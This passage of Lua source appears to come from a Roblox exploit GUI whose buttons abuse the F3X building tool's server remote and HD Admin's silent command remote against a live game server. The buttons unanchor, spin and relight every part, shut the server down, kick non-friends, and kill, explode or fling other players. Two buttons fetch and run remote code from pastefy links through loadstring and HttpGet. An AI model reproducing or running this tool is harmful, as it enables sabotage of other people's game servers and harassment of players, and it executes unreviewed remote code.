            if targetMesh and (targetMesh.MeshId == targetingMeshId or targetMesh.MeshId == "111891702759441") then
                table.insert(activeSkies, { 
                    part = obj, 
                    baseCF = obj.CFrame,
                    mesh = targetMesh
                })
            end
        end 
    end 
    
    if #activeSkies == 0 then return end
    
    local smallestSkyIndex = 1
    local smallestVolume = math.huge
    
    for i, skyData in ipairs(activeSkies) do
        local currentScale = skyData.mesh.Scale
        local volume = currentScale.X * currentScale.Y * currentScale.Z
        if volume < smallestVolume then
            smallestVolume = volume
            smallestSkyIndex = i
        end
    end
    
    local smallestSky = activeSkies[smallestSkyIndex]
    call({ "SyncMesh", {{ Part = smallestSky.part, Scale = Vector3.new(9000, 9000, 9000) }} })
    
    local rotX, rotY, rotZ = 0, 0, 0
    local hueTime = 0
    local speedX = math.rad(50) 
    local speedY = math.rad(50) 
    local speedZ = math.rad(50) 
    
    connection = RunService.Heartbeat:Connect(function(dt) 
        local syncRotatePayload = {}
        local syncMeshPayload = {}
        local validSkiesExist = false
        
        rotX = (rotX + speedX * dt) % (math.pi * 2) 
        rotY = (rotY + speedY * dt) % (math.pi * 2) 
        rotZ = (rotZ + speedZ * dt) % (math.pi * 2) 
        
        hueTime = hueTime + dt * 2
        local wave = (math.sin(hueTime) + 1) / 2
        local sharedRotation = CFrame.Angles(rotX, rotY, rotZ)
        
        for i = #activeSkies, 1, -1 do
            local skyData = activeSkies[i]
            local targetPart = skyData.part
            
            if targetPart and targetPart.Parent then 
                validSkiesExist = true
                
                local nextCF = skyData.baseCF * sharedRotation
                table.insert(syncRotatePayload, { Part = targetPart, CFrame = nextCF })
                targetPart.CFrame = nextCF 
                
                local currentBaseSize = (i == smallestSkyIndex) and 10000 or 99999
                local dynamicScale = currentBaseSize + (wave * 20000)
                
                table.insert(syncMeshPayload, { 
                    Part = targetPart, 
                    Scale = Vector3.new(dynamicScale, dynamicScale, dynamicScale)
                })
            else
                table.remove(activeSkies, i)
            end
        end
        
        if not validSkiesExist then 
            if connection then 
                connection:Disconnect() 
                connection = nil 
            end 
            return 
        end 
        
        if #syncRotatePayload > 0 then
            call({ "SyncRotate", syncRotatePayload })
        end
        if #syncMeshPayload > 0 then
            call({ "SyncMesh", syncMeshPayload })
        end
    end) 
end 

Sky()

end)
end

local Page3 = Instance.new("Frame")
Page3.Name = "Page3"
Page3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Page3.BackgroundTransparency = 1
Page3.BorderColor3 = Color3.fromRGB(0, 0, 0)
Page3.BorderSizePixel = 0
Page3.Size = UDim2.new(0, 542, 0, 565)
Page3.Visible = false
Page3.Parent = R[2]

local ScrollingFrame = Instance.new("ScrollingFrame")
ScrollingFrame.Name = "ScrollingFrame"
ScrollingFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 0, 0)
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScrollingFrame.BackgroundTransparency = 1
ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Position = UDim2.new(0, 0, 0.0200501252, 0)
ScrollingFrame.Size = UDim2.new(0, 542, 0, 391)
R[226] = ScrollingFrame
ScrollingFrame.Parent = Page3

local TextButton9 = Instance.new("TextButton")
TextButton9.Name = "TextButton"
TextButton9.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton9.Text = "unanchor parts"
TextButton9.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton9.TextSize = 20
TextButton9.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton9.TextWrapped = true
TextButton9.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton9.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton9.BorderSizePixel = 2
TextButton9.Position = UDim2.new(0.00999999978, 0, 0.0410000011, 0)
TextButton9.Size = UDim2.new(0, 113, 0, 53)
TextButton9.Parent = ScrollingFrame

local LocalScript38 = Instance.new("Folder")
LocalScript38.Name = "LocalScript"
LocalScript38.Parent = TextButton9
__S[#__S + 1] = function(...)
local script = LocalScript38
script.Parent.MouseButton1Click:Connect(function()
local player = game.Players.LocalPlayer
local char = player.Character
local backpack = player.Backpack

local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end

	return nil
end

local f3x = getf3x()
if not f3x then
	warn("you dont have f3x skid")
	return
end

local syncapi = f3x.SyncAPI
local serverendpoint = syncapi.ServerEndpoint

local function unanchorAll()
	local anchorBatch = {}

	for _, v in ipairs(workspace:GetDescendants()) do
		if (v:IsA("BasePart") or v:IsA("UnionOperation")) 
			and v.Name ~= "Sky" 
			and v.Name ~= "Skybox" 
			and v.Name ~= "Terrain" then
			
			if not v:FindFirstAncestorOfClass("Model") or not game.Players:GetPlayerFromCharacter(v:FindFirstAncestorOfClass("Model")) then
				table.insert(anchorBatch, {
					Part = v,
					Anchored = false
				})
			end
		end
	end

	if #anchorBatch > 0 then
		serverendpoint:InvokeServer("SyncAnchor", anchorBatch)
	end
end

unanchorAll()

end)
end

local TextButton10 = Instance.new("TextButton")
TextButton10.Name = "TextButton"
TextButton10.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton10.Text = "lights parts"
TextButton10.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton10.TextSize = 20
TextButton10.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton10.TextWrapped = true
TextButton10.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton10.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton10.BorderSizePixel = 2
TextButton10.Position = UDim2.new(0.219232544, 0, 0.0405357555, 0)
TextButton10.Size = UDim2.new(0, 113, 0, 53)
TextButton10.Parent = ScrollingFrame

local LocalScript39 = Instance.new("Folder")
LocalScript39.Name = "LocalScript"
LocalScript39.Parent = TextButton10
__S[#__S + 1] = function(...)
local script = LocalScript39
script.Parent.MouseButton1Click:Connect(function()

local player = game.Players.LocalPlayer
local tool

for _, v in ipairs(player:GetDescendants()) do
	if v.Name == "SyncAPI"
		and v.Parent:FindFirstChild("Tools")
		and not v.Parent.Tools:FindFirstChild("Marketplace") then
		tool = v.Parent
		break
	end
end

if not tool then
	for _, v in ipairs(player:GetDescendants()) do
		if v.Name == "SyncAPI" then
			tool = v.Parent
			break
		end
	end
end

if not tool or not tool:FindFirstChild("SyncAPI") then
	warn("SyncAPI tool not found")
	return
end

local remote = tool.SyncAPI.ServerEndpoint

local function GetPartsFromSelection(selection)
	local parts = {}

	for _, descendant in ipairs(selection:GetDescendants()) do
		if descendant:IsA("BasePart")
			and descendant.Name ~= "Terrain"
			and not descendant.Name:find("Sky") then
			table.insert(parts, descendant)
		end
	end

	return parts
end

local function SpawnLights()
	task.defer(function()
		local lightCreationList = {}

		for _, part in ipairs(GetPartsFromSelection(workspace)) do
			table.insert(lightCreationList, {
				Part = part,
				LightType = "PointLight"
			})
		end

		remote:InvokeServer("CreateLights", lightCreationList)
	end)
end

local function ConfigureLights()
	task.defer(function()
		local lightSyncList = {}

		for _, part in ipairs(GetPartsFromSelection(workspace)) do
			table.insert(lightSyncList, {
				Part = part,
				LightType = "PointLight",
				Color = Color3.fromRGB(255, 0, 0),
				ColorR = 255,
				ColorG = 0,
				ColorB = 0,
				Brightness = 40,
				Range = 60,
				Shadows = false,
				Enabled = true
			})
		end

		remote:InvokeServer("SyncLight", lightSyncList)
	end)
end

SpawnLights()
task.wait(0.5)
ConfigureLights()


end)
end

local TextButton11 = Instance.new("TextButton")
TextButton11.Name = "TextButton"
TextButton11.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton11.Text = "fire parts"
TextButton11.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton11.TextSize = 20
TextButton11.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton11.TextWrapped = true
TextButton11.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton11.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton11.BorderSizePixel = 2
TextButton11.Position = UDim2.new(0.427464962, 0, 0.0408346616, 0)
TextButton11.Size = UDim2.new(0, 113, 0, 53)
TextButton11.Parent = ScrollingFrame

local LocalScript40 = Instance.new("Folder")
LocalScript40.Name = "LocalScript"
LocalScript40.Parent = TextButton11
__S[#__S + 1] = function(...)
local script = LocalScript40
script.Parent.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/nfBkHWjZ/raw"))()
end)
end

local TextButton12 = Instance.new("TextButton")
TextButton12.Name = "TextButton"
TextButton12.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton12.Text = "rotate parts"
TextButton12.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton12.TextSize = 20
TextButton12.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton12.TextWrapped = true
TextButton12.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton12.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton12.BorderSizePixel = 2
TextButton12.Position = UDim2.new(0.639999986, 0, 0.0410000011, 0)
TextButton12.Size = UDim2.new(0, 113, 0, 53)
TextButton12.Parent = ScrollingFrame

local LocalScript41 = Instance.new("Folder")
LocalScript41.Name = "LocalScript"
LocalScript41.Parent = TextButton12
__S[#__S + 1] = function(...)
local script = LocalScript41
script.Parent.MouseButton1Click:Connect(function()
local player = game.Players.LocalPlayer
local char = player.Character
local backpack = player.Backpack

local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(player:GetDescendants()) do
		if v.Name == "SyncAPI" then return v.Parent end
	end
	for _, v in ipairs(game.ReplicatedStorage:GetDescendants()) do
		if v.Name == "SyncAPI" then return v.Parent end
	end
	return nil
end

local tool = getf3x()
if not tool then 
	warn("No F3X found!")
	return 
end

local remote = tool.SyncAPI.ServerEndpoint
local function _(args)
	remote:InvokeServer(unpack(args))
end

local function RandomRotateAllParts()
	local targets = {}
	local moveBatch = {}
	local random = Random.new()

	for _, v in ipairs(workspace:GetDescendants()) do
		if v:IsA("BasePart") and v.Name ~= "Terrain" and v.Name ~= "Sky" and v.Name ~= "Skybox" and not v:IsDescendantOf(char) then
			table.insert(targets, v)
		end
	end

	for _, part in ipairs(targets) do
		local randomRotation = CFrame.Angles(
			math.rad(random:NextInteger(0, 360)),
			math.rad(random:NextInteger(0, 360)),
			math.rad(random:NextInteger(0, 360))
		)
		
		local targetCFrame = CFrame.new(part.Position) * randomRotation

		table.insert(moveBatch, {
			["Part"] = part,
			["CFrame"] = targetCFrame
		})
	end

	local chunkSize = 300
	for i = 1, #moveBatch, chunkSize do
		local batch = {}
		for j = i, math.min(i + chunkSize - 1, #moveBatch) do
			table.insert(batch, moveBatch[j])
		end
		
		task.spawn(function()
			_({"SyncMove", batch})
		end)
	end
end

RandomRotateAllParts()

end)
end

local TextButton13 = Instance.new("TextButton")
TextButton13.Name = "TextButton"
TextButton13.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton13.Text = "shutdown"
TextButton13.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton13.TextSize = 20
TextButton13.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton13.TextWrapped = true
TextButton13.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton13.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton13.BorderSizePixel = 2
TextButton13.Position = UDim2.new(0.034446802, 0, 0.332728654, 0)
TextButton13.Size = UDim2.new(0, 113, 0, 53)
TextButton13.Parent = ScrollingFrame

local LocalScript42 = Instance.new("Folder")
LocalScript42.Name = "LocalScript"
LocalScript42.Parent = TextButton13
__S[#__S + 1] = function(...)
local script = LocalScript42
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";shutdown")
RequestCommand:InvokeServer(";kick nonfriends server shutdown for maintenance")
end)
end

local TextButton14 = Instance.new("TextButton")
TextButton14.Name = "TextButton"
TextButton14.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton14.Text = "RE all"
TextButton14.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton14.TextSize = 20
TextButton14.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton14.TextWrapped = true
TextButton14.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton14.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton14.BorderSizePixel = 2
TextButton14.Position = UDim2.new(0.639781177, 0, 0.245009348, 0)
TextButton14.Size = UDim2.new(0, 113, 0, 53)
TextButton14.Parent = ScrollingFrame

local LocalScript43 = Instance.new("Folder")
LocalScript43.Name = "LocalScript"
LocalScript43.Parent = TextButton14
__S[#__S + 1] = function(...)
local script = LocalScript43
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";re nonfriends")
end)
end

local TextButton15 = Instance.new("TextButton")
TextButton15.Name = "TextButton"
TextButton15.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton15.Text = "explode all"
TextButton15.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton15.TextSize = 20
TextButton15.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton15.TextWrapped = true
TextButton15.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton15.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton15.BorderSizePixel = 2
TextButton15.Position = UDim2.new(0.449550062, 0, 0.245009348, 0)
TextButton15.Size = UDim2.new(0, 113, 0, 53)
TextButton15.Parent = ScrollingFrame

local LocalScript44 = Instance.new("Folder")
LocalScript44.Name = "LocalScript"
LocalScript44.Parent = TextButton15
__S[#__S + 1] = function(...)
local script = LocalScript44
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";explode nonfriends")
end)
end

local TextButton16 = Instance.new("TextButton")
TextButton16.Name = "TextButton"
TextButton16.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton16.Text = "kill all"
TextButton16.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton16.TextSize = 20
TextButton16.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton16.TextWrapped = true
TextButton16.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton16.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton16.BorderSizePixel = 2
TextButton16.Position = UDim2.new(0.268932492, 0, 0.333497852, 0)
TextButton16.Size = UDim2.new(0, 113, 0, 53)
TextButton16.Parent = ScrollingFrame

local LocalScript45 = Instance.new("Folder")
LocalScript45.Name = "LocalScript"
LocalScript45.Parent = TextButton16
__S[#__S + 1] = function(...)
local script = LocalScript45
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";kill nonfriends")
end)
end

local TextButton17 = Instance.new("TextButton")
TextButton17.Name = "TextButton"
TextButton17.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton17.Text = "faster walkspeed"
TextButton17.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton17.TextSize = 20
TextButton17.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton17.TextWrapped = true
TextButton17.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton17.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton17.BorderSizePixel = 2
TextButton17.Position = UDim2.new(-0.0227746442, 0, 0.255803555, 0)
TextButton17.Size = UDim2.new(0, 113, 0, 53)
TextButton17.Parent = ScrollingFrame

local LocalScript46 = Instance.new("Folder")
LocalScript46.Name = "LocalScript"
LocalScript46.Parent = TextButton17
__S[#__S + 1] = function(...)
local script = LocalScript46
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";speed me 50")
end)
end

local TextButton18 = Instance.new("TextButton")
TextButton18.Name = "TextButton"
TextButton18.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton18.Text = "baseplate"
TextButton18.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton18.TextSize = 20
TextButton18.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton18.TextWrapped = true
TextButton18.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton18.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton18.BorderSizePixel = 2
TextButton18.Position = UDim2.new(0.00878489576, 0, 0.105783254, 0)
TextButton18.Size = UDim2.new(0, 113, 0, 53)
TextButton18.Parent = ScrollingFrame

local LocalScript47 = Instance.new("Folder")
LocalScript47.Name = "LocalScript"
LocalScript47.Parent = TextButton18
__S[#__S + 1] = function(...)
local script = LocalScript47
script.Parent.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/5AqJI3NG/raw"))()
end)
end

local TextButton19 = Instance.new("TextButton")
TextButton19.Name = "TextButton"
TextButton19.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton19.Text = "god mode"
TextButton19.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton19.TextSize = 20
TextButton19.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton19.TextWrapped = true
TextButton19.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton19.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton19.BorderSizePixel = 2
TextButton19.Position = UDim2.new(0.217297822, 0, 0.114035852, 0)
TextButton19.Size = UDim2.new(0, 113, 0, 53)
TextButton19.Parent = ScrollingFrame

local LocalScript48 = Instance.new("Folder")
LocalScript48.Name = "LocalScript"
LocalScript48.Parent = TextButton19
__S[#__S + 1] = function(...)
local script = LocalScript48
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";god")
end)
end

local TextButton20 = Instance.new("TextButton")
TextButton20.Name = "TextButton"
TextButton20.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton20.Text = "respawn all"
TextButton20.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton20.TextSize = 20
TextButton20.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton20.TextWrapped = true
TextButton20.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton20.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton20.BorderSizePixel = 2
TextButton20.Position = UDim2.new(0.427435726, 0, 0.112946399, 0)
TextButton20.Size = UDim2.new(0, 113, 0, 53)
TextButton20.Parent = ScrollingFrame

local LocalScript49 = Instance.new("Folder")
LocalScript49.Name = "LocalScript"
LocalScript49.Parent = TextButton20
__S[#__S + 1] = function(...)
local script = LocalScript49
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";respawn all")
end)
end

local TextButton21 = Instance.new("TextButton")
TextButton21.Name = "TextButton"
TextButton21.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton21.Text = "punish all"
TextButton21.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton21.TextSize = 20
TextButton21.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton21.TextWrapped = true
TextButton21.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton21.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton21.BorderSizePixel = 2
TextButton21.Position = UDim2.new(0.639807045, 0, 0.112946399, 0)
TextButton21.Size = UDim2.new(0, 113, 0, 53)
TextButton21.Parent = ScrollingFrame

local LocalScript50 = Instance.new("Folder")
LocalScript50.Name = "LocalScript"
LocalScript50.Parent = TextButton21
__S[#__S + 1] = function(...)
local script = LocalScript50
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";punish all")
end)
end

local TextButton22 = Instance.new("TextButton")
TextButton22.Name = "TextButton"
TextButton22.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton22.Text = "fling all"
TextButton22.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton22.TextSize = 20
TextButton22.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton22.TextWrapped = true
TextButton22.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton22.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton22.BorderSizePixel = 2
TextButton22.Position = UDim2.new(0.1840875, 0, 0.266312599, 0)
TextButton22.Size = UDim2.new(0, 113, 0, 53)
TextButton22.Parent = ScrollingFrame

local LocalScript51 = Instance.new("Folder")
LocalScript51.Name = "LocalScript"
LocalScript51.Parent = TextButton22
__S[#__S + 1] = function(...)
local script = LocalScript51
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";fling nonfriends")

end)
end

local UIGridLayout = Instance.new("UIGridLayout")
UIGridLayout.Name = "UIGridLayout"
UIGridLayout.CellSize = UDim2.new(0, 100, 0, 55)
UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout.Parent = ScrollingFrame

local TextButton23 = Instance.new("TextButton")
TextButton23.Name = "TextButton"
TextButton23.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton23.Text = "dancing avatar sky"
TextButton23.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton23.TextSize = 14
TextButton23.TextWrapped = true
TextButton23.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton23.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton23.BorderSizePixel = 2
TextButton23.Position = UDim2.new(0.66601181, 0, 0.724924505, 0)
TextButton23.Size = UDim2.new(0, 74, 0, 31)
TextButton23.Parent = ScrollingFrame

local LocalScript52 = Instance.new("Folder")
LocalScript52.Name = "LocalScript"
LocalScript52.Parent = TextButton23
__S[#__S + 1] = function(...)
local script = LocalScript52
script.Parent.MouseButton1Click:Connect(function()


	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

	RequestCommand:InvokeServer(";unfog")

	local player = game.Players.LocalPlayer
	local char = player.Character or player.CharacterAdded:Wait()
	local tool

	for i, v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	for i, v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	local remote = tool.SyncAPI.ServerEndpoint
	local RunService = game:GetService("RunService")

	function _(args)
		remote:InvokeServer(unpack(args))
	end

	function CreatePart(cf, parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end

	function SetAnchor(part, boolean)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end

	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part, meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://" .. meshid
				}
			}
		}
		_(args)
	end

	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = texid
				}
			}
		}
		_(args)
	end

	function MeshResize(part, size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end

	function SetTransparency(part, value)
		local args = {
			[1] = "SyncTransparency",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = value
				}
			}
		}
		_(args)
	end

	function SetVertexColor(part, vertexColor)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["VertexColor"] = vertexColor
				}
			}
		}
		_(args)
	end

	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end

	local images = {
		"http://www.roblox.com/asset/?id=100517725383259",
		"http://www.roblox.com/asset/?id=108968299114697",
		"http://www.roblox.com/asset/?id=75961396810991",
		"http://www.roblox.com/asset/?id=73153381593508",
		"http://www.roblox.com/asset/?id=110376340305303",
		"http://www.roblox.com/asset/?id=132960021309807",
		"http://www.roblox.com/asset/?id=100517725383259",
		"http://www.roblox.com/asset/?id=108968299114697"
	}

	local skyPart
	local skyLoop
	local frameTime = 0.07
	local lastUpdate = 0

	function CreateSky()
		local hrp = char:FindFirstChild("HumanoidRootPart")
		if not hrp then return end

		local cf = hrp.CFrame
		CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)

		for _, v in workspace:GetDescendants() do
			if v:IsA("BasePart") and (v.CFrame.Position - (cf.Position + Vector3.new(0, 6, 0))).Magnitude < 0.1 then
				skyPart = v
				SetAnchor(skyPart, true)
				AddMesh(skyPart)
				SetMesh(skyPart, "111891702759441")
				MeshResize(skyPart, Vector3.new(99999, 99999, 99999))
				SetTransparency(skyPart, 1)
				SetVertexColor(skyPart, Vector3.new(3,3,3))

				local index = 1
				skyLoop = RunService.Heartbeat:Connect(function(deltaTime)
					lastUpdate = lastUpdate + deltaTime
					if lastUpdate >= frameTime then
						lastUpdate = 0
						if not skyPart then
							skyLoop:Disconnect()
							return
						end
						SetTransparency(skyPart, 0)
						SetTexture(skyPart, images[index])
						index = index % #images + 1
					end
				end)
			end
		end
	end

	function ResetSky()
		if skyPart then
			DestroyPart(skyPart)
			skyPart = nil
		end
		if skyLoop then
			skyLoop:Disconnect()
			skyLoop = nil
		end
		CreateSky()
	end

	player.CharacterAdded:Connect(function(newChar)
		char = newChar
		ResetSky()
	end)

	if char and char:FindFirstChild("Humanoid") then
		char:WaitForChild("Humanoid").Died:Connect(function()
			ResetSky()
		end)
	end

	CreateSky()

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

	RequestCommand:InvokeServer(";time 0 ;fogcolor black")
end)
end

local TextButton24 = Instance.new("TextButton")
TextButton24.Name = "TextButton"
TextButton24.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton24.Text = "dancing avatar sky small"
TextButton24.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton24.TextSize = 14
TextButton24.TextWrapped = true
TextButton24.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton24.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton24.BorderSizePixel = 2
TextButton24.Position = UDim2.new(0.813359499, 0, 0.724924505, 0)
TextButton24.Size = UDim2.new(0, 74, 0, 31)
TextButton24.Parent = ScrollingFrame

local LocalScript53 = Instance.new("Folder")
LocalScript53.Name = "LocalScript"
LocalScript53.Parent = TextButton24
__S[#__S + 1] = function(...)
local script = LocalScript53
script.Parent.MouseButton1Click:Connect(function()


	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

	RequestCommand:InvokeServer(";fog 99999999999999")

	local player = game.Players.LocalPlayer
	local char = player.Character or player.CharacterAdded:Wait()
	local tool

	for i, v in player:GetDescendants() do
